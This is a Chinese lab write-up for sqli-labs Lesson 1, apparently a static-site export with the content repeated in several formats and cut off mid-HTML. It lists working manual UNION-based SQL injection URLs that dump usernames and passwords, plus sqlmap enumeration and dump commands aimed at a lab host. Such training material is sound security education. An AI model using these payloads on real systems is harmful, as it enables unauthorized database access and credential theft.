WHERE id='$id' LIMIT 0,1\";`\n\n通过get请求提交的数据会被$id接收,举个例子，上图中`1' and '1'='2`就是我手动输入的部分,在SQL语句中就变成这样:\n\n`SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1`\n\n可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。\n\n但是单单这样还是不够的,`and '1'='2' LIMIT 0,1`在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。\n\nmysql的注释方式有以下几种：\n\n* 第一种:#\t\n\n\t\\#在url中编码为`%23`\n\n* 第二种:-- (注意--后面还有个空格)\n\n\t空格的编码是`%20`\n\n* 第三种:--+ \n\n\t第二种的变形,浏览器会把`+`编码成空格\n\n`'`的url编码为`%27`,下面的测试先把单引号用`%27`表示,空格用`%20`表示,#用`%23`,避免出问题。在url中输入如下:\n\n> 第一种:#\n\n`http://10.60.250.214/Less-1/?id=1%27%20%23`\n\n![6](https://i.imgur.com/X5WsedG.png)\n\n> 第二种：-- (注意--后面还有个空格)\n\n`http://10.60.250.214/Less-1/?id=1%27%20--%20`\n\n![7](https://i.imgur.com/CPbYISh.png)\n\n> 第三种:--+\n\n`http://10.60.250.214/Less-1/?id=1%27%20--+`\n\n![8](https://i.imgur.com/TW7fFE7.png)\n\n### 猜字段 ###\n\n#### 猜字段数 ####\n\n这里我采用第一种注释方式,当然其他的也可以。\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23`\n\n这里我换了个hackbar插件,原来那个有bug\n\n![9](https://i.imgur.com/ZIXMXUP.png)\n\norder by 数字1~3显示的都与这个页面相同,表示至少有3个字段\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23`\n\n![10](https://i.imgur.com/lfKFcjO.png)\n\n图片上的报错信息是:\n\n`SELECT * FROM users WHERE id='1' order by 4#' LIMIT 0,1\nUnknown column '4' in 'order clause'`\n\n说明第4个字段不存在,那就只有3个字段。\n\n#### 猜字段排序 ####\n\n使用union select联合查询,后面接查到的字段个数。如下:\n\n`http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23`\n\n![11](https://i.imgur.com/uyB1sZ5.png)\n\n可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:\n\n![12](https://i.imgur.com/T9tGY5M.png)\n\n标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。\n\n`http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23`\n\n![13](https://i.imgur.com/iQTBrk4.png)\n\n显示出id=2的数据信息。\n\n将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23`\n\n![14](https://i.imgur.com/EtoeD7e.png)\n\n显示出字段顺序,推测字段中排序顺序应该是id,name,password。\n\n### 获取数据库信息 ###\nuser():返回当前数据库连接使用的用户\n\ndatabase():返回当前数据库连接使用的数据库\n\nversion():返回当前数据库的版本\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23`\n\n![15](https://i.imgur.com/O4iLDlC.png)\n\n### 获取表 ###\n\ngroup_concat函数:将查询到的多行结果连接成字符串\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23`\n\n![16](https://i.imgur.com/aW1ZQ52.png)\n\n### 获取字段 ###\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23`\n\n![17](https://i.imgur.com/yXgseWp.png)\n\n### 获取值 ###\n\n`http://10.60.250.214/Less-1/?id=-1' union select 1,2,group_concat(username,':',password) from users%23`\n\n![18](https://i.imgur.com/72LA4RH.png)\n\n## SQLMAP ##\n\n### 基础命令 ###\n\nSQLMAP的基础命令如下：\n\n>列举数据库\n\nsqlmap -u “注入地址” -v 1 –-dbs\n\n>当前数据库\n\nsqlmap -u “注入地址” -v 1 –-current-db\n\n>列数据库用户\n\nsqlmap -u “注入地址” -v 1 –-users\n\n\n>当前用户\n\nsqlmap -u “注入地址” -v 1 –-current-user\n\n>列举数据库的表名\n\nsqlmap -u “注入地址” -v 1 -D “数据库” –-tables\n\n>获取表的列名\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns\n\n>获取表中的数据\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump\n\n### 获取数据库 ###\n**-u** \n<font color=#8470FF>\n**指定url** \n</font>\n\n\n**--dbs** \n<font color=#8470FF>\n**爆破数据库** \n</font>\n\n**--batch**\n<font color=#8470FF>\n**默认运行** \n</font>\n\n**--technique**  \n<font color=#8470FF>\n\n指定sqlmap使用的检测技术\n\n* B:Boolean-based-blind  （布尔型型注入）\n\n* E:Error-based   （报错型注入）\n\n* U:Union query-based  （联合注入）\n\n* S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）\n\n* T:Time-based blind  （基于时间延迟注入）\n\n</font>\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" --dbs --batch --technique B`\n\n![20](https://i.imgur.com/6EobR3x.png)\n\n![19](https://i.imgur.com/ZzNnuBy.png)\n\n### 获取表 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security --tables`\n\n![22](https://i.imgur.com/RbMVkf4.png)\n\n![21](https://i.imgur.com/yFC9jZD.png)\n\n### 获取表的列名 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns`\n\n![24](https://i.imgur.com/keAEMDi.png)\n\n![23](https://i.imgur.com/mkkn61S.png)\n\n### 获取表中数据 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns --dump`\n\n![26](https://i.imgur.com/hclOrZ5.png)\n\n![25](https://i.imgur.com/qrbRqfl.png)","source":"img/sql/lesson1/lesson1.md","raw":"# sqli-labs lession 1 (基于错误的GET单引号字符型注入) #\n---\n## 登录界面 ##\n![1](https://i.imgur.com/7iOF74D.png)\n## 手注 ##\n\n### 判断注入类型 ###\n>sqli-labs 第一课很人性化地给予提示,在url处添加id。\n\n\n`http://10.60.250.214/Less-1/?id=1`\n![2](https://i.imgur.com/wwGtJ0S.png)\n>由于是get请求方法,以后碰到就直接填写了。\n\n输入单引号\n\n`http://10.60.250.214/Less-1/?id=1'`\n\n![3](https://i.imgur.com/Kgh75tO.png)\n\n引起报错\n`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`\n\n根据报错信息,猜测加入的id'参数在SQL语句中应该被对称的单引号包含。\n\n继续验证猜想:\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='1`\n\n页面正常，这里不贴图了\n\n继续检验\n\n`http://10.60.250.214/Less-1/?id=1' and '1'='2`\n\n页面异常\n\n![4](https://i.imgur.com/6u8cFW1.png)\n\n存在字符型的注入\n\n在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分\n\n![5](https://i.imgur.com/vibteUL.png)\n\n`$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";`\n\n通过get请求提交的数据会被$id接收,举个例子，上图中`1' and '1'='2`就是我手动输入的部分,在SQL语句中就变成这样:\n\n`SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1`\n\n可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。\n\n但是单单这样还是不够的,`and '1'='2' LIMIT 0,1`在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。\n\nmysql的注释方式有以下几种：\n\n* 第一种:#\t\n\n\t\\#在url中编码为`%23`\n\n* 第二种:-- (注意--后面还有个空格)\n\n\t空格的编码是`%20`\n\n* 第三种:--+ \n\n\t第二种的变形,浏览器会把`+`编码成空格\n\n`'`的url编码为`%27`,下面的测试先把单引号用`%27`表示,空格用`%20`表示,#用`%23`,避免出问题。在url中输入如下:\n\n> 第一种:#\n\n`http://10.60.250.214/Less-1/?id=1%27%20%23`\n\n![6](https://i.imgur.com/X5WsedG.png)\n\n> 第二种：-- (注意--后面还有个空格)\n\n`http://10.60.250.214/Less-1/?id=1%27%20--%20`\n\n![7](https://i.imgur.com/CPbYISh.png)\n\n> 第三种:--+\n\n`http://10.60.250.214/Less-1/?id=1%27%20--+`\n\n![8](https://i.imgur.com/TW7fFE7.png)\n\n### 猜字段 ###\n\n#### 猜字段数 ####\n\n这里我采用第一种注释方式,当然其他的也可以。\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23`\n\n这里我换了个hackbar插件,原来那个有bug\n\n![9](https://i.imgur.com/ZIXMXUP.png)\n\norder by 数字1~3显示的都与这个页面相同,表示至少有3个字段\n\n`http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23`\n\n![10](https://i.imgur.com/lfKFcjO.png)\n\n图片上的报错信息是:\n\n`SELECT * FROM users WHERE id='1' order by 4#' LIMIT 0,1\nUnknown column '4' in 'order clause'`\n\n说明第4个字段不存在,那就只有3个字段。\n\n#### 猜字段排序 ####\n\n使用union select联合查询,后面接查到的字段个数。如下:\n\n`http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23`\n\n![11](https://i.imgur.com/uyB1sZ5.png)\n\n可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:\n\n![12](https://i.imgur.com/T9tGY5M.png)\n\n标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。\n\n`http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23`\n\n![13](https://i.imgur.com/iQTBrk4.png)\n\n显示出id=2的数据信息。\n\n将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23`\n\n![14](https://i.imgur.com/EtoeD7e.png)\n\n显示出字段顺序,推测字段中排序顺序应该是id,name,password。\n\n### 获取数据库信息 ###\nuser():返回当前数据库连接使用的用户\n\ndatabase():返回当前数据库连接使用的数据库\n\nversion():返回当前数据库的版本\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23`\n\n![15](https://i.imgur.com/O4iLDlC.png)\n\n### 获取表 ###\n\ngroup_concat函数:将查询到的多行结果连接成字符串\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23`\n\n![16](https://i.imgur.com/aW1ZQ52.png)\n\n### 获取字段 ###\n\n`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23`\n\n![17](https://i.imgur.com/yXgseWp.png)\n\n### 获取值 ###\n\n`http://10.60.250.214/Less-1/?id=-1' union select 1,2,group_concat(username,':',password) from users%23`\n\n![18](https://i.imgur.com/72LA4RH.png)\n\n## SQLMAP ##\n\n### 基础命令 ###\n\nSQLMAP的基础命令如下：\n\n>列举数据库\n\nsqlmap -u “注入地址” -v 1 –-dbs\n\n>当前数据库\n\nsqlmap -u “注入地址” -v 1 –-current-db\n\n>列数据库用户\n\nsqlmap -u “注入地址” -v 1 –-users\n\n\n>当前用户\n\nsqlmap -u “注入地址” -v 1 –-current-user\n\n>列举数据库的表名\n\nsqlmap -u “注入地址” -v 1 -D “数据库” –-tables\n\n>获取表的列名\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns\n\n>获取表中的数据\nsqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump\n\n### 获取数据库 ###\n**-u** \n<font color=#8470FF>\n**指定url** \n</font>\n\n\n**--dbs** \n<font color=#8470FF>\n**爆破数据库** \n</font>\n\n**--batch**\n<font color=#8470FF>\n**默认运行** \n</font>\n\n**--technique**  \n<font color=#8470FF>\n\n指定sqlmap使用的检测技术\n\n* B:Boolean-based-blind  （布尔型型注入）\n\n* E:Error-based   （报错型注入）\n\n* U:Union query-based  （联合注入）\n\n* S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）\n\n* T:Time-based blind  （基于时间延迟注入）\n\n</font>\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" --dbs --batch --technique B`\n\n![20](https://i.imgur.com/6EobR3x.png)\n\n![19](https://i.imgur.com/ZzNnuBy.png)\n\n### 获取表 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security --tables`\n\n![22](https://i.imgur.com/RbMVkf4.png)\n\n![21](https://i.imgur.com/yFC9jZD.png)\n\n### 获取表的列名 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns`\n\n![24](https://i.imgur.com/keAEMDi.png)\n\n![23](https://i.imgur.com/mkkn61S.png)\n\n### 获取表中数据 ###\n\n`sqlmap -u \"http://10.60.250.214/Less-1/?id=1\" -v 1 -D security -T users --columns --dump`\n\n![26](https://i.imgur.com/hclOrZ5.png)\n\n![25](https://i.imgur.com/qrbRqfl.png)","date":"2019-06-19T17:23:14.389Z","updated":"2019-06-19T17:23:14.389Z","path":"img/sql/lesson1/lesson1.html","title":"","comments":1,"layout":"page","_id":"cjx3ists700ax4dsbxm3snebs","content":"<h1 id=\"sqli-labs-lession-1-基于错误的GET单引号字符型注入\"><a href=\"#sqli-labs-lession-1-基于错误的GET单引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession 1 (基于错误的GET单引号字符型注入)\"></a>sqli-labs lession 1 (基于错误的GET单引号字符型注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/7iOF74D.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><blockquote>\n<p>sqli-labs 第一课很人性化地给予提示,在url处添加id。</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1</code><br><img src=\"https://i.imgur.com/wwGtJ0S.png\" alt=\"2\"></p>\n<blockquote>\n<p>由于是get请求方法,以后碰到就直接填写了。</p>\n</blockquote>\n<p>输入单引号</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39;</code></p>\n<p><img src=\"https://i.imgur.com/Kgh75tO.png\" alt=\"3\"></p>\n<p>引起报错<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息,猜测加入的id’参数在SQL语句中应该被对称的单引号包含。</p>\n<p>继续验证猜想:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1</code></p>\n<p>页面正常，这里不贴图了</p>\n<p>继续检验</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2</code></p>\n<p>页面异常</p>\n<p><img src=\"https://i.imgur.com/6u8cFW1.png\" alt=\"4\"></p>\n<p>存在字符型的注入</p>\n<p>在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分</p>\n<p><img src=\"https://i.imgur.com/vibteUL.png\" alt=\"5\"></p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>\n<p>通过get请求提交的数据会被$id接收,举个例子，上图中<code>1&#39; and &#39;1&#39;=&#39;2</code>就是我手动输入的部分,在SQL语句中就变成这样:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code></p>\n<p>可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。</p>\n<p>但是单单这样还是不够的,<code>and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。</p>\n<p>mysql的注释方式有以下几种：</p>\n<ul>\n<li><p>第一种:#    </p>\n<p>  #在url中编码为<code>%23</code></p>\n</li>\n<li><p>第二种:– (注意–后面还有个空格)</p>\n<p>  空格的编码是<code>%20</code></p>\n</li>\n<li><p>第三种:–+ </p>\n<p>  第二种的变形,浏览器会把<code>+</code>编码成空格</p>\n</li>\n</ul>\n<p><code>&#39;</code>的url编码为<code>%27</code>,下面的测试先把单引号用<code>%27</code>表示,空格用<code>%20</code>表示,#用<code>%23</code>,避免出问题。在url中输入如下:</p>\n<blockquote>\n<p>第一种:#</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20%23</code></p>\n<p><img src=\"https://i.imgur.com/X5WsedG.png\" alt=\"6\"></p>\n<blockquote>\n<p>第二种：– (注意–后面还有个空格)</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--%20</code></p>\n<p><img src=\"https://i.imgur.com/CPbYISh.png\" alt=\"7\"></p>\n<blockquote>\n<p>第三种:–+</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--+</code></p>\n<p><img src=\"https://i.imgur.com/TW7fFE7.png\" alt=\"8\"></p>\n<h3 id=\"猜字段\"><a href=\"#猜字段\" class=\"headerlink\" title=\"猜字段\"></a>猜字段</h3><h4 id=\"猜字段数\"><a href=\"#猜字段数\" class=\"headerlink\" title=\"猜字段数\"></a>猜字段数</h4><p>这里我采用第一种注释方式,当然其他的也可以。</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23</code></p>\n<p>这里我换了个hackbar插件,原来那个有bug</p>\n<p><img src=\"https://i.imgur.com/ZIXMXUP.png\" alt=\"9\"></p>\n<p>order by 数字1~3显示的都与这个页面相同,表示至少有3个字段</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23</code></p>\n<p><img src=\"https://i.imgur.com/lfKFcjO.png\" alt=\"10\"></p>\n<p>图片上的报错信息是:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; order by 4#&#39; LIMIT 0,1\nUnknown column &#39;4&#39; in &#39;order clause&#39;</code></p>\n<p>说明第4个字段不存在,那就只有3个字段。</p>\n<h4 id=\"猜字段排序\"><a href=\"#猜字段排序\" class=\"headerlink\" title=\"猜字段排序\"></a>猜字段排序</h4><p>使用union select联合查询,后面接查到的字段个数。如下:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"https://i.imgur.com/uyB1sZ5.png\" alt=\"11\"></p>\n<p>可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:</p>\n<p><img src=\"https://i.imgur.com/T9tGY5M.png\" alt=\"12\"></p>\n<p>标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。</p>\n<p><code>http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"https://i.imgur.com/iQTBrk4.png\" alt=\"13\"></p>\n<p>显示出id=2的数据信息。</p>\n<p>将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23</code></p>\n<p><img src=\"https://i.imgur.com/EtoeD7e.png\" alt=\"14\"></p>\n<p>显示出字段顺序,推测字段中排序顺序应该是id,name,password。</p>\n<h3 id=\"获取数据库信息\"><a href=\"#获取数据库信息\" class=\"headerlink\" title=\"获取数据库信息\"></a>获取数据库信息</h3><p>user():返回当前数据库连接使用的用户</p>\n<p>database():返回当前数据库连接使用的数据库</p>\n<p>version():返回当前数据库的版本</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23</code></p>\n<p><img src=\"https://i.imgur.com/O4iLDlC.png\" alt=\"15\"></p>\n<h3 id=\"获取表\"><a href=\"#获取表\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p>group_concat函数:将查询到的多行结果连接成字符串</p>\n<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></p>\n<p><img src=\"https://i.imgur.com/aW1ZQ52.png\" alt=\"16\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23</code></p>\n<p><img src=\"https://i.imgur.com/yXgseWp.png\" alt=\"17\"></p>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><p><code>http://10.60.250.214/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,password) from users%23</code></p>\n<p><img src=\"https://i.imgur.com/72LA4RH.png\" alt=\"18\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><h3 id=\"基础命令\"><a href=\"#基础命令\" class=\"headerlink\" title=\"基础命令\"></a>基础命令</h3><p>SQLMAP的基础命令如下：</p>\n<blockquote>\n<p>列举数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-dbs</p>\n<blockquote>\n<p>当前数据库</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-db</p>\n<blockquote>\n<p>列数据库用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-users</p>\n<blockquote>\n<p>当前用户</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 –-current-user</p>\n<blockquote>\n<p>列举数据库的表名</p>\n</blockquote>\n<p>sqlmap -u “注入地址” -v 1 -D “数据库” –-tables</p>\n<blockquote>\n<p>获取表的列名<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns</p>\n</blockquote>\n<blockquote>\n<p>获取表中的数据<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump</p>\n</blockquote>\n<h3 id=\"获取数据库\"><a href=\"#获取数据库\" class=\"headerlink\" title=\"获取数据库\"></a>获取数据库</h3><p><strong>-u</strong><br><font color=\"#8470FF\"><br><strong>指定url</strong><br></font></p>\n<p><strong>–dbs</strong><br><font color=\"#8470FF\"><br><strong>爆破数据库</strong><br></font></p>\n<p><strong>–batch</strong><br><font color=\"#8470FF\"><br><strong>默认运行</strong><br></font></p>\n<p><strong>–technique</strong><br><font color=\"#8470FF\"></font></p>\n<p>指定sqlmap使用的检测技术</p>\n<ul>\n<li><p>B:Boolean-based-blind  （布尔型型注入）</p>\n</li>\n<li><p>E:Error-based   （报错型注入）</p>\n</li>\n<li><p>U:Union query-based  （联合注入）</p>\n</li>\n<li><p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>\n</li>\n<li><p>T:Time-based blind  （基于时间延迟注入）</p>\n</li>\n</ul>\n\n\n<p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; --dbs --batch --technique B</code></p>\n<p><img src=\"https://i.imgur.com/6EobR3x.png\" alt=\"20\"></p>\n<p><img src=\"https://i.imgur.com/ZzNnuBy.png\" alt=\"19\"></p>\n<h3 id=\"获取表-1\"><a href=\"#获取表-1\" class=\"headerlink\" title=\"获取表\"></a>获取表</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security --tables</code></p>\n<p><img src=\"https://i.imgur.com/RbMVkf4.png\" alt=\"22\"></p>\n<p><img src=\"https://i.imgur.com/yFC9jZD.png\" alt=\"21\"></p>\n<h3 id=\"获取表的列名\"><a href=\"#获取表的列名\" class=\"headerlink\" title=\"获取表的列名\"></a>获取表的列名</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns</code></p>\n<p><img src=\"https://i.imgur.com/keAEMDi.png\" alt=\"24\"></p>\n<p><img src=\"https://i.imgur.com/mkkn61S.png\" alt=\"23\"></p>\n<h3 id=\"获取表中数据\"><a href=\"#获取表中数据\" class=\"headerlink\" title=\"获取表中数据\"></a>获取表中数据</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns --dump</code></p>\n<p><img src=\"https://i.imgur.com/hclOrZ5.png\" alt=\"26\"></p>\n<p><img src=\"https://i.imgur.com/qrbRqfl.png\" alt=\"25\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-1-基于错误的GET单引号字符型注入\"><a href=\"#sqli-labs-lession-1-基于错误的GET单引号字符型注入\" class=\"headerlink\" title=\"sqli-labs lession 1 (基于错误的GET单引号字符型注入)\"></a>sqli-labs lession 1 (基于错误的GET单引号字符型注入)</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"https://i.imgur.com/7iOF74D.png\" alt=\"1\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><h3 id=\"判断注入类型\"><a href=\"#判断注入类型\" class=\"headerlink\" title=\"判断注入类型\"></a>判断注入类型</h3><blockquote>\n<p>sqli-labs 第一课很人性化地给予提示,在url处添加id。</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1</code><br><img src=\"https://i.imgur.com/wwGtJ0S.png\" alt=\"2\"></p>\n<blockquote>\n<p>由于是get请求方法,以后碰到就直接填写了。</p>\n</blockquote>\n<p>输入单引号</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39;</code></p>\n<p><img src=\"https://i.imgur.com/Kgh75tO.png\" alt=\"3\"></p>\n<p>引起报错<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>\n<p>根据报错信息,猜测加入的id’参数在SQL语句中应该被对称的单引号包含。</p>\n<p>继续验证猜想:</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1</code></p>\n<p>页面正常，这里不贴图了</p>\n<p>继续检验</p>\n<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2</code></p>\n<p>页面异常</p>\n<p><img src=\"https://i.imgur.com/6u8cFW1.png\" alt=\"4\"></p>\n<p>存在字符型的注入</p>\n<p>在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分</p>\n<p><img src=\"https://i.imgur.com/vibteUL.png\" alt=\"5\"></p>\n<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>\n<p>通过get请求提交的数据会被$id接收,举个例子，上图中<code>1&#39; and &#39;1&#39;=&#39;2</code>就是我手动输入的部分,在SQL语句中就变成这样:</p>\n<p><code>SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code></p>\n<p>可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。</p>\n<p>但是单单这样还是不够的,<code>and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。</p>\n<p>mysql的注释方式有以下几种：</p>\n<ul>\n<li><p>第一种:#    </p>\n<p>  #在url中编码为<code>%23</code></p>\n</li>\n<li><p>第二种:– (注意–后面还有个空格)</p>\n<p>  空格的编码是<code>%20</code></p>\n</li>\n<li><p>第三种:–+ </p>\n<p>  第二种的变形,浏览器会把<code>+</code>编码成空格</p>\n</li>\n</ul>\n<p><code>&#39;</code>的url编码为<code>%27</code>,下面的测试先把单引号用<code>%27</code>表示,空格用<code>%20</code>表示,#用<code>%23</code>,避免出问题。在url中输入如下:</p>\n<blockquote>\n<p>第一种:#</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20%23</code></p>\n<p><img src=\"https://i.imgur.com/X5WsedG.png\" alt=\"6\"></p>\n<blockquote>\n<p>第二种：– (注意–后面还有个空格)</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--%20</code></p>\n<p><img src=\"https://i.imgur.com/CPbYISh.png\" alt=\"7\"></p>\n<blockquote>\n<p>第三种:–+</p>\n</blockquote>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20--+</code></p>\n<p><img src=\"https://i.imgur.com/TW7fFE7.png\" alt=\"8\"></p>\n<h3 id=\"猜字段\"><a href=\"#猜字段\" class=\"headerlink\" title=\"猜字段\"></a>猜字段</h3><h4 id=\"猜字段数\"><a href=\"#猜字段数\" class=\"headerlink\" title=\"猜字段数\"></a>猜字段数</h4><p>这里我采用第一种注释方式,当然其他的也可以。</p>\n<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23</code></p>\n<p>这里我换了个hackbar插件,原来那个有bug</p>\n<p><img 